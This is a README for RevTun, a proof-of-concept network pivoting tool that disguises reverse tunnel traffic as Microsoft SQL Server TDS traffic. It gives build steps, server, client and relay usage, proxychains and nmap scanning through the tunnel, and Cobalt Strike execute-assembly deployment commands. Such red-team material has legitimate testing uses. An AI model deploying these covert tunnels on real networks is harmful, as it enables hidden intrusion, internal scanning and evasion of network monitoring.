# RevTun

RevTun is a POC tool for network pivoting. It operates similar to chisel, ligolo and ssh tunneling. The main difference is that it uses the Microsoft SQL Server TDS protocol to make the network traffic look like MSSQL traffic.

It operates in 3 modes:
- **Server**: Listens on a port (1433 by default). Once it receives a client connection, it opens another port (1080 by default). Through the second port, we can use proxychains/tun2socks to forward all traffic though the client.
- **Client**: Connects to server or to the relay using authentic MSSQL authentication. Forwards all traffic from the server.
- **Relay**: Relays the traffic from the client to the server. Use case: the client cannot directly reach the server but can reach the relay machine.

## Building

### Quick Build
```powershell
.\build-multi.ps1  # Builds .NET Framework 4.8, Linux x64, Windows x64
```

### Manual Builds
```bash
# Windows x64
dotnet publish -c Release -f net8.0 -r win-x64 --self-contained true -p:PublishSingleFile=true

# Linux x64  
dotnet publish -c Release -f net8.0 -r linux-x64 --self-contained true -p:PublishSingleFile=true

# Cobalt Strike (.NET Framework 4.8)
dotnet build -c Release -f net48 -p:Platform=AnyCPU
```

## Usage

### Server
```bash
./revtun server --port 1433 --proxy-port 1080
```

### Client 
```bash
./revtun client --host server.com --port 1433 --encrypt
```

### Relay (Traffic Forwarding)
```bash
./revtun relay --host target-server.com --port 1433 --server-port 1433 --debug
```

### Using SOCKS Proxy
```bash
curl --proxy socks5://localhost:1080 http://internal-resource.local
proxychains nmap -sT 192.168.1.0/24
```

## Cobalt Strike Integration

### Deployment
```bash
# Client from internal network  
execute-assembly revtun.exe client --host [external-ip] --port 1433 --encrypt

# Relay on pivot host
execute-assembly revtun.exe relay --host [internal-sql-server] --port 1433
```

## Command Options

### Server
```
--port, -p <port>          MSSQL server port (default: 1433)
--proxy-port <port>        SOCKS proxy port (default: 1080)  
--bind <address>           Bind address (default: 0.0.0.0)
--verbose, -v              Enable verbose logging
--require-encryption       Require TLS encryption
```

### Client  
```
--host, -h <hostname>      Server hostname (default: localhost)
--port, -p <port>          Server port (default: 1433)
--username, -u <user>      SQL username (default: sa)
--password <pass>          SQL password (default: Password123)
--auto-exit                Exit after connection test
--verbose, -v              Enable verbose logging
--debug                    Enable debug output
--encrypt                  Request TLS encryption
```

### Relay
```
--port, -p <port>          Relay listener port (default: 1433)
--bind <address>           Bind address (default: 0.0.0.0)
--host, -h <hostname>      Target server hostname (default: localhost)
--server-port <port>       Target server port (default: 1433)
--verbose, -v              Enable verbose logging
--debug                    Enable debug output with TDS packet analysis
```
